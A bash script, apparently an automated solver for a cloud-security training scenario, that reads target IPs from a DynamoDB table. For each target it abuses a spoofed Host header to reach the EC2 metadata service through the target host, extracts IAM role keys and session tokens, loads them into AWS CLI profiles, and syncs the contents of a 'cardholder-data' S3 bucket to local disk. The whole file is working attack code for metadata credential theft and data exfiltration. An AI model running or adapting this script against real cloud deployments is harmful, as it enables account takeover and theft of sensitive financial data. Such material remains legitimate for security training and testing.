#!/bin/bash
#aws dynamodb scan --table-name users --profile $1 > ./db.json
table_name=($(aws dynamodb scan --table-name users --profile $1))
# user_email=($(cat db.json | jq .Items[].email.S | tr -d '"'))
name=($(cat db.json | jq .Items[].email.S | tr -d '"' | cut -d @ -f 1))
# secret_key=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.secret_key.S | tr -d '"'))
# access_key=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.access_key.S | tr -d '"'))
# username=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.username.S | tr -d '"'))
#target_ip=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.target_ip.S | tr -d '"'))
target_ip=($(echo ${table_name[@]} | jq .Items[].scenarios.M.scenario2.M.target_ip.S | tr -d '"'))
# completion_key=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.completion_key.S | tr -d '"'))
# target_lambda=($(cat db.json | jq .Items[].scenarios.M.scenario2.M.target_lambda.S | tr -d '"'))



if [ ! -f ~/.aws/config_bacup ]
  then
    cp ~/.aws/config ~/.aws/config_bacup
    cp ~/.aws/credentials ~/.aws/credentials_bacup
fi
mkdir ./sc2_folder
for ((i = 0; i < ${#target_ip[@]}; i++))
    do
        echo "************************"
        echo "user${i}, "${username[i]}", "${user_email[i]}", "${target_ip}
        echo "curl -s http://${target_ip[i]}/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'"
        ec2_role=($(curl -s http://${target_ip[i]}/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'))
        echo
        echo "curl http://${target_ip[i]}/latest/meta-data/iam/security-credentials/${ec2_role} -H 'Host:169.254.169.254'"
        tem=($(curl http://${target_ip[i]}/latest/meta-data/iam/security-credentials/${ec2_role} -H 'Host:169.254.169.254'))
        token=($(echo ${tem[@]} | jq .Token | tr -d '"'))
        access_key_id=($(echo ${tem[@]} | jq .AccessKeyId | tr -d '"'))
        secret_access_key=($(echo ${tem[@]} | jq .SecretAccessKey | tr -d '"'))
        echo
        echo "aws configure --profile user${i}"
        echo "   -*- set aws_access_key_id: ${access_key_id}"
        aws configure set aws_access_key_id ${access_key_id} --profile user${i}
        echo "   -*- set aws_secret_access_key: ${secret_access_key}"
        aws configure set aws_secret_access_key ${secret_access_key} --profile user${i}
        echo "   -*- set region: eu-central-1"
        aws configure set region eu-central-1 --profile user${i}
        echo "   -*- set output: json"
        aws configure set output json --profile user${i}
        echo "   -*- set aws_session_token: ${token}"
        aws configure set aws_session_token ${token} --profile user${i}
        echo
        echo "get bucket-name"
        bucket_name=($(aws s3 ls --profile user${i} | grep "sc2-cardholder-data-bucket" | cut -d " " -f3))
        echo ${bucket_name}
        echo
        echo "get secret files"
        aws s3 sync s3://${bucket_name} ./sc2_folder/user${i}-data --profile user${i}
        echo "------------------------"
    done